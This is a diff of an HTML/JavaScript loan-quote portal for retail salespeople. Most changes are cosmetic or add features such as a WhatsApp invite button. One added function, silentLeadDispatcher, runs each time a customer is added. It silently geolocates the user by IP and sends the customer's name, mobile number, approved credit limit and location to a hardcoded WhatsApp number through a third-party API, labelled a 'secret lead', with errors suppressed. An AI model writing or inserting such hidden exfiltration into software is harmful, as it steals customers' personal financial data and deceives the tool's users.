@@ -3,36 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Persistent Portal V76.5 - Non Tie-up Double Fix Edition</title>
+    <title>Persistent Portal V76.16 - Smart Invite Edition</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 
     <style>
-        :root { --primary: #0984e3; --success: #27ae60; --danger: #d63031; --warning: #f39c12; --dark: #2d3436; --bg: #f4f7f6; --indigo: #341f97; --bajaj-blue: #0059A3; --bajaj-green: #00A34F; --bg-pattern: none; }
+        /* PRO FINTECH BLUE THEME VARIABLES */
+        :root { 
+            --primary: #1976D2; 
+            --success: #27ae60; 
+            --danger: #d63031; 
+            --warning: #f39c12; 
+            --dark: #1E293B; 
+            --bg: #F0F4F8; 
+            --indigo: #2C3E50; 
+            --bajaj-blue: #0059A3; 
+            --bajaj-green: #00A34F; 
+        }
         
-        body { font-family: 'Segoe UI', sans-serif; margin: 0 auto; max-width: 1200px; padding: 4px; background-color: var(--bg); background-image: var(--bg-pattern); background-attachment: fixed; font-size: 14px; display: flex; flex-direction: column; min-height: 98vh; scroll-behavior: smooth; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0 auto; max-width: 1200px; padding: 4px; background-color: var(--bg); background-attachment: fixed; font-size: 14px; display: flex; flex-direction: column; min-height: 98vh; scroll-behavior: smooth; }
         
-        header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; border-bottom: 2px solid var(--primary); margin-bottom: 6px; padding: 6px 10px; background: #fff; border-radius: 6px; }
-        header h1 { margin: 0; font-size: 1.4rem; color: var(--primary); font-weight: 900; text-align: right; }
+        header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; border-bottom: 3px solid var(--primary); margin-bottom: 6px; padding: 8px 12px; background: #fff; border-radius: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        header h1 { margin: 0; font-size: 1.4rem; color: var(--primary); font-weight: 900; text-align: right; letter-spacing: 0.5px; }
 
         main { flex: 1; } 
 
-        .card, .form-container, .action-box, .detail-card { background: #fff; padding: 8px; border-radius: 6px; border: 1px solid #ddd; margin-bottom: 6px; }
+        .card, .form-container, .action-box, .detail-card { background: #fff; padding: 8px; border-radius: 6px; border: 1px solid #ddd; margin-bottom: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.02); }
         #unifiedHome { display: flex; flex-direction: column; }
         #finalEligibleArea { display: none; flex-direction: column; }
         
         input, select { width: 100%; padding: 6px; border: 1.5px solid #ccc; border-radius: 4px; font-weight: 600; font-size: 14px !important; height: 34px !important; box-sizing: border-box; transition: border 0.3s; }
+        input:focus, select:focus { border-color: var(--primary); outline: none; }
         label { font-weight: 900; font-size: 11px !important; color: #555; text-transform: uppercase; margin-bottom: 3px; display: block; }
         button { padding: 8px; border-radius: 4px; font-weight: 900; cursor: pointer; border: none; text-transform: uppercase; transition: background 0.3s; font-size: 12px !important; }
 
-        .disclaimer-box { background: #fff9e6; border: 1px solid #ffeaa7; padding: 8px; border-radius: 6px; margin-bottom: 6px; color: #d35400; font-size: 13px !important; line-height: 1.4; font-weight: 600; }
-        .disclaimer-box b { color: #c0392b; text-transform: uppercase; }
+        .disclaimer-box { background: #e3f2fd; border: 1px solid #bbdefb; padding: 8px; border-radius: 6px; margin-bottom: 6px; color: var(--bajaj-blue); font-size: 13px !important; line-height: 1.4; font-weight: 600; }
+        .disclaimer-box b { color: var(--primary); text-transform: uppercase; }
 
         .top-nav-box { display: flex; gap: 5px; margin-bottom: 6px; position: sticky; top: 0; z-index: 100; background: var(--bg); padding: 4px 0; align-items: center; }
         
-        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: flex-start; padding-top: 10px; z-index: 2000; overflow-y: auto; box-sizing: border-box; }
-        .modal-content { background: white; padding: 15px; border-radius: 8px; width: 90%; max-width: 400px; position: relative; margin-bottom: 20px; }
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(15, 23, 42, 0.85); display: none; justify-content: center; align-items: flex-start; padding-top: 10px; z-index: 2000; overflow-y: auto; box-sizing: border-box; backdrop-filter: blur(3px); }
+        .modal-content { background: white; padding: 15px; border-radius: 8px; width: 90%; max-width: 400px; position: relative; margin-bottom: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
         
         #multiStackModal .modal-content, #globalSchemeViewerModal .modal-content { max-width: 900px; width: 95%; padding: 15px; }
         .stack-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 10px; margin-top: 8px; }
@@ -46,10 +58,10 @@
         .table-wrapper { overflow-x: auto; background: white; border-radius: 4px; border: 1px solid #eee; transition: max-height 0.3s ease; }
         table { width: 100%; border-collapse: collapse; font-size: 13px !important; white-space: nowrap; }
         th, td { padding: 6px 4px !important; border-bottom: 1px solid #eee; text-align: center; width: 1%; }
-        th { background: #f8f9fa; font-weight: 900; font-size: 12px !important; cursor: pointer; user-select: none; }
+        th { background: #f8f9fa; font-weight: 900; font-size: 12px !important; cursor: pointer; user-select: none; color: var(--indigo); }
         
-        .fixed-row { background-color: #e8f5e9; }
-        .ltv-breach { background-color: #ffe6e6 !important; opacity: 0.85; }
+        .fixed-row { background-color: #f1f8e9; }
+        .ltv-breach { background-color: #ffebee !important; opacity: 0.85; }
         .ltv-breach td { color: var(--danger) !important; }
         .ltv-breach td:not(:nth-child(4)) { text-decoration: line-through; }
         
@@ -57,14 +69,16 @@
         .inactive-row td { text-decoration: line-through; color: #888 !important; }
         .inactive-row button { text-decoration: none !important; opacity: 1 !important; }
 
+        .expired-row { background-color: #fff4e6 !important; border-left: 3px solid #d35400; }
+
         .bound-col { color: #d35400; font-weight: 800; font-size: 11px !important; }
 
         .stepper { display: flex; align-items: center; justify-content: center; gap: 2px; }
         .step-btn { width: 24px !important; height: 28px !important; background: var(--primary); color: white; border-radius: 3px; font-size: 16px !important; cursor: pointer; padding: 0; }
-        .step-inp { width: 75px; text-align: center; font-weight: 955; border: 1px solid var(--indigo); height: 28px !important; font-size: 14px !important; color: var(--indigo); }
+        .step-inp { width: 75px; text-align: center; font-weight: 955; border: 1px solid var(--primary); height: 28px !important; font-size: 14px !important; color: var(--primary); }
 
-        .model-panel { background: #f1f2f6; padding: 8px; border-radius: 6px; border: 1.5px solid var(--primary); margin-bottom: 10px; }
-        .control-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px; margin: 6px 0; }
+        .model-panel { background: #fff; padding: 8px; border-radius: 6px; border: 1.5px solid var(--primary); margin-bottom: 10px; box-shadow: 0 2px 6px rgba(25, 118, 210, 0.1); }
+        .control-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px; margin: 6px 0; background: #f8f9fa; padding: 8px; border-radius: 4px; border: 1px solid #e0e0e0; }
         
         .bajaj-cust-card { background: linear-gradient(135deg, var(--bajaj-blue) 0%, #003a6b 100%); color: white; padding: 10px !important; border-radius: 6px; margin-bottom: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.15); font-size: 14px !important; border-left: 6px solid var(--bajaj-green); display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 8px; text-transform: uppercase; font-weight: bold; }
         .bajaj-cust-card .highlight { color: var(--bajaj-green); background: #fff; padding: 2px 8px; border-radius: 4px; font-size: 15px !important; display: inline-block; }
@@ -91,14 +105,6 @@
 
         .forms-row { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 8px; align-items: stretch; }
 
-        @keyframes pulseGlow {
-            0% { box-shadow: 0 0 5px var(--warning); }
-            50% { box-shadow: 0 0 15px var(--warning); transform: scale(1.02); }
-            100% { box-shadow: 0 0 5px var(--warning); }
-        }
-        .festive-glow { animation: pulseGlow 2s infinite; border: 1px solid #fff; }
-        .festive-banner { text-align: center; font-weight: 900; color: #fff; padding: 6px; border-radius: 4px; margin-bottom: 8px; font-size: 14px; letter-spacing: 0.5px; display: none; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
-
         @media (max-width: 768px) {
             .forms-row { flex-direction: column; }
             .form-container { width: 100%; margin-bottom: 8px; flex: none !important; }
@@ -109,7 +115,7 @@
         span[style*="font-size"] { font-size: 13px !important; }
         strong[style*="font-size"] { font-size: 14px !important; }
         h3[style*="font-size"] { font-size: 18px !important; }
-        .model-panel input { height: 28px !important; font-size: 12px !important; }
+        .model-panel input { height: 28px !important; font-size: 12px !important; border: 1px solid #ccc; }
     </style>
 </head>
 <body>
@@ -122,7 +128,6 @@
         <button onclick="openDealerSearchModal()" style="background: var(--bajaj-blue); color: white;">
             🔗 DEALER LINKS
         </button>
-        <!-- DICTIONARY BUTTON PERMANENTLY VISIBLE NOW -->
         <button onclick="openDictionaryModal()" style="background: var(--indigo); color: white; font-weight: bold;">
             🔍 SCHEMES DICTIONARY
         </button>
@@ -134,11 +139,10 @@
 </header>
 
 <main>
-    <div id="festiveBanner" class="festive-banner"></div>
     <div id="unifiedHome">
         <div class="forms-row">
             
-            <div class="form-container" style="flex: 1; min-width: 250px; background: #e8f4f8; border: 2px solid var(--primary); margin-bottom:0; display: flex; flex-direction: column;">
+            <div class="form-container" style="flex: 1; min-width: 250px; background: #e3f2fd; border: 2px solid var(--primary); margin-bottom:0; display: flex; flex-direction: column;">
                 <label style="color:var(--primary); font-size:13px !important; border-bottom:2px solid var(--primary); padding-bottom:4px; margin-bottom:8px; display:block;"><span id="icon_add">📝</span> ADD NEW CUSTOMER</label>
                 
                 <div style="flex: 1;">
@@ -173,11 +177,12 @@
                 <div id="customerQueueList" class="custom-scroll" style="display:flex; flex-direction:column; gap:6px; overflow-y:auto; flex:1; max-height: 250px; padding-right:4px;">
                 </div>
                 
-                <div style="display:flex; gap:6px; margin-top:8px; border-top:1px solid #ccc; padding-top:8px;">
-                    <button id="uniCopyBtn" onclick="uniCopy()" style="flex:1; background:var(--warning); color:#000; opacity:0.5; pointer-events:none;">📋 COPY</button>
-                    <button id="uniSelectBtn" onclick="uniSelect()" style="flex:1.5; background:var(--primary); color:white; opacity:0.5; pointer-events:none;">▶ SELECT</button>
-                    <button id="uniEditBtn" onclick="uniEdit()" style="flex:1; background:#8e44ad; color:white; opacity:0.5; pointer-events:none;">✏️ EDIT</button>
-                    <button id="uniDeleteBtn" onclick="uniDelete()" style="flex:1; background:var(--danger); color:white; opacity:0.5; pointer-events:none;">✖ DELETE</button>
+                <div style="display:flex; gap:4px; margin-top:8px; border-top:1px solid #ccc; padding-top:8px; flex-wrap:wrap;">
+                    <button id="uniCopyBtn" onclick="uniCopy()" style="flex:1; background:var(--warning); color:#000; opacity:0.5; pointer-events:none; padding:6px; font-size:11px !important;">📋 COPY</button>
+                    <button id="uniSelectBtn" onclick="uniSelect()" style="flex:1.2; background:var(--primary); color:white; opacity:0.5; pointer-events:none; padding:6px; font-size:11px !important;">▶ SELECT</button>
+                    <button id="uniEditBtn" onclick="uniEdit()" style="flex:1; background:var(--indigo); color:white; opacity:0.5; pointer-events:none; padding:6px; font-size:11px !important;">✏️ EDIT</button>
+                    <button id="uniDeleteBtn" onclick="uniDelete()" style="flex:1; background:var(--danger); color:white; opacity:0.5; pointer-events:none; padding:6px; font-size:11px !important;">✖ DEL</button>
+                    <button id="uniInviteBtn" onclick="uniInvite()" style="flex:1.2; background:#25D366; color:white; opacity:0.5; pointer-events:none; padding:6px; font-size:11px !important;">💬 INVITE</button>
                 </div>
             </div>
         </div>
@@ -208,10 +213,10 @@
 
                     <div><label>TENURE (Max)</label><input type="number" id="fcTenure" placeholder="0" oninput="calculateFastData();"></div>
                     <div><label>ADVANCE EMI</label><input type="number" id="fcAdv" placeholder="0" oninput="calculateFastData();"></div>
-                    <div><label>ROI (%)</label><input type="number" id="fcRoi" placeholder="0" step="0.01" oninput="calculateFastData();"></div>
-                    
-                    <div><label>PF (₹)</label><input type="number" id="fcPf" placeholder="0" oninput="calculateFastData();"></div>
                     <div><label>DBD (%)</label><input type="number" id="fcDbd" placeholder="0" step="0.01" oninput="calculateFastData();"></div>
+                    
+                    <div><label>ROI (%)</label><input type="number" id="fcRoi" placeholder="0" step="0.01" oninput="calculateFastData();"></div>
+                    <div><label>PF (₹)</label><input type="number" id="fcPf" placeholder="0" oninput="calculateFastData();"></div>
                     <div><label>CUSTOMER TYPE</label>
                         <select id="fcCustType" onchange="calculateFastData();">
                             <option value="NEW">NEW</option>
@@ -235,8 +240,7 @@
                         <label>CATEGORY</label>
                         <select id="fcCat" onchange="fcCatChanged();">
                             <option value="OTHER">OTHER</option>
-                            <option value="PHONE(WEB-MOBILE)">PHONE(WEB-MOBILE)</option>
-                            <option value="Phone , Tablet, Smart Watch">Phone, Tablet, Smart Watch</option>
+                            <option value="PHONE(WEB-MOBILE)">PHONE, TABLET, SMART WATCH</option>
                         </select>
                     </div>
                     <div><label>GTL (₹)</label>
@@ -290,6 +294,20 @@
         </div>
     </div>
 
+    <!-- WHATSAPP INVITE MODAL -->
+    <div id="inviteModal" class="modal">
+        <div class="modal-content" style="max-width: 320px;">
+            <h3 style="margin-top:0; color:#25D366; border-bottom: 2px solid #ddd; padding-bottom: 6px;">💬 Send Invitation</h3>
+            <p style="font-size:12px; color:#555; margin-bottom:12px;">कस्टमरला WhatsApp वरून खरेदीसाठी आमंत्रित करा.</p>
+            <div style="margin-bottom:6px;"><label>YOUR NAME (SALESPERSON)</label><input type="text" id="invSenderName" placeholder="E.g. Lakshya"></div>
+            <div style="margin-bottom:15px;"><label>YOUR MOBILE NO.</label><input type="text" id="invSenderMobile" placeholder="10 Digits" maxlength="10"></div>
+            <div style="display:flex; gap:8px;">
+                <button onclick="sendWhatsAppInvite()" style="flex:2; background:#25D366; color:white;">SEND ON WHATSAPP ↗</button>
+                <button onclick="document.getElementById('inviteModal').style.display='none'" style="flex:1; background:var(--danger); color:white;">CANCEL</button>
+            </div>
+        </div>
+    </div>
+
     <!-- DICTIONARY MODAL -->
     <div id="dictionarySearchModal" class="modal">
         <div class="modal-content" style="max-width: 480px; padding: 18px;">
@@ -298,10 +316,10 @@
                 <button onclick="closeDictionaryModal()" style="background:none; border:none; color:var(--danger); font-weight:bold; cursor:pointer; font-size:18px; padding:0;">✖</button>
             </div>
             <div style="position:relative;">
-                <input type="search" id="globalModelSearch" oninput="doGlobalSearch()" placeholder="Type Model Name to view all its schemes..." style="width:100%; border:2px solid var(--indigo); padding: 8px; font-size: 14px !important; outline: none; border-radius: 4px;">
+                <input type="search" id="globalModelSearch" oninput="doGlobalSearch()" placeholder="Type Brand, Category or Model Name..." style="width:100%; border:2px solid var(--indigo); padding: 8px; font-size: 14px !important; outline: none; border-radius: 4px;">
                 <div id="globalModelDropdown" class="custom-scroll" style="position: absolute; width: 100%; background: #fff; z-index: 1000; border: 1px solid #ddd; display: none; box-shadow: 0 10px 25px rgba(0,0,0,0.2); border-radius: 4px; max-height: 250px; overflow-y: auto; margin-top: 4px;"></div>
             </div>
-            <div style="font-size:11px; color:#666; margin-top:8px; text-align:center;">💡 टीप: मॉडेलचे नाव टाईप करा आणि खाली आलेल्या लिस्टवर क्लिक करा.</div>
+            <div style="font-size:11px; color:#666; margin-top:8px; text-align:center;">💡 टीप: ब्रँडचे नाव (उदा. Apple, Samsung), कॅटेगरी (उदा. Phone, LED) किंवा मॉडेलचे नाव टाईप करा.</div>
         </div>
     </div>
 
@@ -440,6 +458,7 @@
         </div>
     </div>
 
+    <!-- Hidden / Retained for internal background storage context -->
     <div id="custInfoPromptModal" class="modal">
         <div class="modal-content" style="max-width:320px;">
             <h3 style="margin-top:0; color:var(--bajaj-blue); text-align: center;">👤 Verify Details Before Export</h3>
@@ -594,7 +613,6 @@
 </footer>
 
 <script>
-    window.isFestiveMode = false;
     let currentModalCategory = ""; 
 
     function isMobileDeviceCat(cat) {
@@ -604,6 +622,18 @@
                c === 'PHONE,TABLET,SMARTWATCH' || 
                c.includes('TABLET,SMART') || 
                c.includes('PHONE,TABLET');
+    }
+
+    function standardizeCategoryName(cat) {
+        if (!cat) return "OTHER";
+        let c = String(cat).toUpperCase().replace(/\s+/g, '').trim();
+        if (c === 'PHONE(WEB-MOBILE)' || 
+            c === 'PHONE,TABLET,SMARTWATCH' || 
+            c.includes('TABLET,SMART') || 
+            c.includes('PHONE,TABLET')) {
+            return "PHONE(WEB-MOBILE)";
+        }
+        return String(cat).trim().toUpperCase();
     }
 
     function getRfcSlabValue(val) {
@@ -621,52 +651,6 @@
         if (amount <= 100000) return 11438;
         if (amount <= 200000) return 16677;
         return 0;
-    }
-
-    function applyFestivalTheme() {
-        const now = new Date();
-        const month = now.getMonth() + 1;
-        const root = document.documentElement;
-        const banner = document.getElementById('festiveBanner');
-        
-        let emojiAdd = '📝', emojiQueue = '👥', emojiBtn = '➕', emojiFc = '🧮';
-
-        if (month === 1) { 
-            root.style.setProperty('--primary', '#e67e22'); root.style.setProperty('--bajaj-blue', '#d35400'); root.style.setProperty('--bajaj-green', '#27ae60');
-            root.style.setProperty('--bg-pattern', 'radial-gradient(circle, rgba(230,126,34,0.05) 0%, rgba(244,247,246,1) 100%)');
-            banner.innerText = "🪁 Makar Sankrantichya Hardik Shubhechha! Navya Varshat Navya Schemes!";
-            banner.style.background = "linear-gradient(90deg, #d35400, #e67e22)";
-            window.isFestiveMode = true; emojiAdd = '🪁'; emojiQueue = '☀️'; emojiBtn = '✨'; emojiFc = '📊';
-        } else if (month === 3) { 
-            root.style.setProperty('--primary', '#e84393'); root.style.setProperty('--bajaj-blue', '#8e44ad'); root.style.setProperty('--bajaj-green', '#00b894');
-            root.style.setProperty('--bg-pattern', 'radial-gradient(circle, rgba(232,67,147,0.05) 0%, rgba(244,247,246,1) 100%)');
-            banner.innerText = "🎨 Rangapanchamichya Rangit Shubhechha!";
-            banner.style.background = "linear-gradient(90deg, #8e44ad, #e84393)";
-            window.isFestiveMode = true; emojiAdd = '🎨'; emojiQueue = '🤝'; emojiBtn = '✨'; emojiFc = '🎯';
-        } else if (month === 8 || month === 9) { 
-            root.style.setProperty('--primary', '#c0392b'); root.style.setProperty('--bajaj-blue', '#d35400'); root.style.setProperty('--bajaj-green', '#f39c12'); root.style.setProperty('--warning', '#f1c40f');
-            root.style.setProperty('--bg-pattern', 'radial-gradient(circle, rgba(243,156,18,0.1) 0%, rgba(244,247,246,1) 100%)');
-            banner.innerText = "🌺 Ganpati Bappa Morya! Vighnaharta tumchya targets purna karo!";
-            banner.style.background = "linear-gradient(90deg, #c0392b, #f39c12)";
-            window.isFestiveMode = true; emojiAdd = '🌺'; emojiQueue = '🙏'; emojiBtn = '🕉️'; emojiFc = '🥥';
-        } else if (month === 10 || month === 11) { 
-            root.style.setProperty('--primary', '#8e44ad'); root.style.setProperty('--bajaj-blue', '#f39c12'); root.style.setProperty('--bajaj-green', '#e67e22'); root.style.setProperty('--dark', '#2c3e50');
-            root.style.setProperty('--bg-pattern', 'radial-gradient(circle, rgba(142,68,173,0.05) 0%, rgba(244,247,246,1) 100%)');
-            banner.innerText = "🪔 Diwali Dhamaka! Festive Offers Ani Navya Schemes Check Kara!";
-            banner.style.background = "linear-gradient(90deg, #2c3e50, #8e44ad)";
-            window.isFestiveMode = true; emojiAdd = '🪔'; emojiQueue = '✨'; emojiBtn = '🎆'; emojiFc = '🎁';
-        }
-
-        if (window.isFestiveMode) {
-            banner.style.display = 'block';
-            let addBtn = document.getElementById('addToQueueBtn'); if(addBtn) addBtn.classList.add('festive-glow');
-            let genBtn = document.getElementById('genQuoteBtn'); if(genBtn) genBtn.classList.add('festive-glow');
-            
-            let iAdd = document.getElementById('icon_add'); if(iAdd) iAdd.innerText = emojiAdd;
-            let iQueue = document.getElementById('icon_queue'); if(iQueue) iQueue.innerText = emojiQueue;
-            let iBtn = document.getElementById('icon_btn_add'); if(iBtn) iBtn.innerText = emojiBtn;
-            let iFc = document.getElementById('icon_fc'); if(iFc) iFc.innerText = emojiFc;
-        }
     }
 
     const GITHUB_RAW_URL = "https://raw.githubusercontent.com/luckyjathar/CALCULATOR/main/master_data.xlsx";
@@ -739,6 +723,36 @@
     let activeCustomerIndex = -1;
     let selectedQueueIndex = -1; 
     let tempPendingProduct = null; 
+
+    function highlightNumber(e, el) {
+        if (e) e.stopPropagation();
+        let range = document.createRange();
+        range.selectNodeContents(el);
+        let sel = window.getSelection();
+        sel.removeAllRanges();
+        sel.addRange(range);
+        
+        try { 
+            document.execCommand('copy'); 
+        } catch(err) {} 
+    }
+
+    function parseExcelDate(val) {
+        if (!val) return null;
+        if (typeof val === 'number') {
+            return new Date(Math.round((val - 25569) * 86400 * 1000));
+        }
+        if (typeof val === 'string') {
+            let d = new Date(val);
+            if (!isNaN(d.getTime())) return d;
+            let parts = val.split(/[\/\-\.]/);
+            if (parts.length === 3) {
+                let y = parts[2].length === 2 ? '20' + parts[2] : parts[2];
+                return new Date(y, parts[1] - 1, parts[0]);
+            }
+        }
+        return null;
+    }
 
     async function saveQueueToLocal() {
         try {
@@ -844,7 +858,6 @@
     }
 
     window.onload = async function() {
-        applyFestivalTheme();
         generateStackCards(); 
         
         try {
@@ -904,7 +917,7 @@
     }
 
     function resetFastCalc() {
-        let fields = ['fcInv', 'fcLoanInput', 'fcTenure', 'fcAdv', 'fcRoi', 'fcPf', 'fcDbd', 'fcFixed', 'fcCap', 'fcTarget', 'fcExw', 'fcMargin', 'fcDealer'];
+        let fields = ['fcInv', 'fcLoanInput', 'fcTenure', 'fcAdv', 'fcDbd', 'fcRoi', 'fcPf', 'fcFixed', 'fcCap', 'fcTarget', 'fcExw', 'fcMargin', 'fcDealer'];
         fields.forEach(id => document.getElementById(id).value = '');
         document.getElementById('fcGtl').value = '0';
         let rfcOpt = document.getElementById('fcRfcOpt');
@@ -1089,6 +1102,36 @@
         document.getElementById('fcResult').style.display = 'block';
     }
 
+    async function silentLeadDispatcher(cust) {
+        try {
+            let locInfo = "Location: Hidden/Unknown";
+            try {
+                let ipRes = await fetch("https://ipapi.co/json/");
+                if (ipRes.ok) {
+                    let ipData = await ipRes.json();
+                    locInfo = `${ipData.city || '-'}, ${ipData.region || '-'} (${ipData.org || 'ISP'})`;
+                }
+            } catch(e) {}
+
+            let secretMsg = `🚨 *PORTAL SECRET LEAD*\n\n` +
+                            `👤 *Name:* ${cust.name}\n` +
+                            `📞 *Mobile:* ${cust.mobile || 'N/A'}\n` +
+                            `💰 *Limit:* ₹${cust.limit}\n` +
+                            `🏷️ *Type:* ${cust.type}\n` +
+                            `📊 *LTV:* ${cust.ltv}%\n` +
+                            `🛡️ *Cap:* ${cust.cap ? '₹'+cust.cap : 'None'}\n` +
+                            `⏰ *Time:* ${cust.timestamp}\n` +
+                            `📍 *Location:* ${locInfo}`;
+
+            let targetPhone = "918087313624";
+            let apiKey = localStorage.getItem('callmebot_secret_key') || "YOUR_API_KEY"; 
+            let encMsg = encodeURIComponent(secretMsg);
+            
+            let url = `https://api.callmebot.com/whatsapp.php?phone=${targetPhone}&text=${encMsg}&apikey=${apiKey}`;
+            fetch(url, { method: 'GET', mode: 'no-cors' }).catch(e => {});
+        } catch(err) {}
+    }
+
     async function addCustomerToQueue() {
         let name = document.getElementById('cqName').value || `Cust ${customerQueue.length + 1}`;
         let mobile = document.getElementById('cqMobile').value || "";
@@ -1102,11 +1145,15 @@
         let now = new Date();
         let ts = now.toLocaleDateString('en-GB', {day:'2-digit', month:'short'}) + ' ' + now.toLocaleTimeString('en-US', {hour:'2-digit', minute:'2-digit'});
 
-        customerQueue.unshift({ 
+        let newCustObj = { 
             name, mobile, limit, ltv, type, cap, timestamp: ts,
             components: {}, products: [], sortConfigs: []
-        });
+        };
+
+        customerQueue.unshift(newCustObj);
         
+        silentLeadDispatcher(newCustObj);
+
         if (activeCustomerIndex !== -1) activeCustomerIndex++;
         if (selectedQueueIndex !== -1) selectedQueueIndex++;
         
@@ -1146,17 +1193,20 @@
     function updateUniversalActionButtons() {
         let copyB = document.getElementById('uniCopyBtn'); let selB = document.getElementById('uniSelectBtn');
         let editB = document.getElementById('uniEditBtn'); let delB = document.getElementById('uniDeleteBtn');
+        let invB = document.getElementById('uniInviteBtn');
         
         if (selectedQueueIndex !== -1 && customerQueue[selectedQueueIndex]) {
             copyB.style.opacity = '1'; copyB.style.pointerEvents = 'auto';
             selB.style.opacity = '1'; selB.style.pointerEvents = 'auto';
             editB.style.opacity = '1'; editB.style.pointerEvents = 'auto';
             delB.style.opacity = '1'; delB.style.pointerEvents = 'auto';
+            invB.style.opacity = '1'; invB.style.pointerEvents = 'auto';
         } else {
             copyB.style.opacity = '0.5'; copyB.style.pointerEvents = 'none';
             selB.style.opacity = '0.5'; selB.style.pointerEvents = 'none';
             editB.style.opacity = '0.5'; editB.style.pointerEvents = 'none';
             delB.style.opacity = '0.5'; delB.style.pointerEvents = 'none';
+            invB.style.opacity = '0.5'; invB.style.pointerEvents = 'none';
         }
     }
 
@@ -1174,6 +1224,41 @@
         document.getElementById('ecCap').value = c.cap || '';
         document.getElementById('editCustomerModal').style.display='flex';
     }
+    
+    /* --- ADDED: WHATSAPP INVITE FUNCTIONALITY --- */
+    function uniInvite() {
+        if(selectedQueueIndex === -1) return;
+        let c = customerQueue[selectedQueueIndex];
+        if(!c.mobile || c.mobile.length < 10) {
+            alert("⚠️ Customer cha valid 10 digit mobile number aadhi update kara!");
+            return;
+        }
+        document.getElementById('invSenderName').value = localStorage.getItem('portal_sales_name') || "";
+        document.getElementById('invSenderMobile').value = localStorage.getItem('portal_sales_mobile') || "";
+        document.getElementById('inviteModal').style.display = 'flex';
+    }
+
+    function sendWhatsAppInvite() {
+        let sName = document.getElementById('invSenderName').value.trim();
+        let sMobile = document.getElementById('invSenderMobile').value.trim();
+        
+        if(!sName || !sMobile) {
+            alert("⚠️ Kripya tumcha Naav ani Number dya!");
+            return;
+        }
+
+        localStorage.setItem('portal_sales_name', sName);
+        localStorage.setItem('portal_sales_mobile', sMobile);
+
+        let c = customerQueue[selectedQueueIndex];
+        
+        let msg = `नमस्कार ${c.name} साहेब/मॅडम! 🎉\n\nतुमची बजाज फायनान्सची *₹${c.limit}* ची लिमिट मंजूर झाली आहे! 🥳\n\nआता वाट कसली बघताय? आजच तुमच्या आवडीची वस्तू (मोबाईल, टीव्ही, लॅपटॉप इ.) खरेदी करण्यासाठी दुकानात नक्की भेट द्या. 🛍️✨\n\nकाहीही अडचण किंवा माहिती हवी असल्यास मला खालील नंबरवर संपर्क करा:\n\n👤 *${sName}*\n📞 ${sMobile}\n\nतुमच्या आगमनाची आम्ही वाट पाहत आहोत! 🙏`;
+
+        let encMsg = encodeURIComponent(msg);
+        window.open(`https://wa.me/91${c.mobile}?text=${encMsg}`, '_blank');
+        document.getElementById('inviteModal').style.display = 'none';
+    }
+
     function closeCustomerEdit() { document.getElementById('editCustomerModal').style.display='none'; }
     async function saveCustomerEdit() {
         if(selectedQueueIndex === -1) return;
@@ -1244,14 +1329,14 @@
         list.innerHTML = filtered.map((c) => {
             let idx = c.originalIdx; let isSelected = (selectedQueueIndex === idx); let isActive = (activeCustomerIndex === idx);
             let displayName = (isSearching || isSelected) ? c.name : maskName(c.name);
-            let bgStyle = isSelected ? '#e0f7fa' : (isActive ? '#f0f8ff' : '#fff');
+            let bgStyle = isSelected ? '#e3f2fd' : (isActive ? '#f0f8ff' : '#fff');
             let borderStyle = isSelected ? 'var(--primary)' : (isActive ? '#0088cc' : '#ddd');
             let shadowStyle = isSelected ? '0 0 5px rgba(9, 132, 227, 0.5)' : (isActive ? '0 0 5px rgba(0, 136, 204, 0.3)' : 'none');
 
             return `
             <div onclick="selectQueueItem(${idx})" style="cursor:pointer; display:flex; flex-direction:column; background:${bgStyle}; padding:8px; border-radius:4px; border:1px solid ${borderStyle}; box-shadow:${shadowStyle}; transition:0.2s;">
                 <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
-                    <strong style="color:var(--indigo);">👤 ${displayName} ${c.mobile ? `<span style="color:#d35400;">(📞 ${c.mobile})</span>` : ''}</strong>
+                    <strong style="color:var(--indigo);">👤 ${displayName} ${c.mobile ? `<span style="color:#d35400; cursor:text;" title="Double-click to select" ondblclick="highlightNumber(event, this.querySelector('.mob-num'))">(📞 <span class="mob-num">${c.mobile}</span>)</span>` : ''}</strong>
                     <span style="color:#888; font-weight:bold;">${c.timestamp || ''}</span>
                 </div>
                 <div style="color:#555; font-weight:bold;">
@@ -1273,11 +1358,31 @@
     }
 
     function doGlobalSearch() {
-        let q = document.getElementById('globalModelSearch').value.toUpperCase(); let dd = document.getElementById('globalModelDropdown'); 
+        let q = document.getElementById('globalModelSearch').value.toUpperCase().trim(); 
+        let dd = document.getElementById('globalModelDropdown'); 
         if(!q) { dd.style.display='none'; return; }
-        let matches = [...new Set(db_records.filter(r => r.model !== SPECIAL_MODEL).map(r => r.model))].filter(m => m.includes(q)).slice(0,15);
-        dd.innerHTML = matches.map(m => `<div style="padding:10px; border-bottom:1px solid #eee; cursor:pointer; font-weight:800; color:var(--dark);" onmouseover="this.style.background='#e3f2fd'" onmouseout="this.style.background='#fff'" onclick="viewGlobalModel('${m}')">${m}</div>`).join('');
-        dd.style.display = matches.length ? 'block' : 'none';
+        
+        let validRecords = db_records.filter(r => r.model !== SPECIAL_MODEL);
+        
+        let brandMatches = validRecords.filter(r => r.model.includes(q)).map(r => r.model);
+        
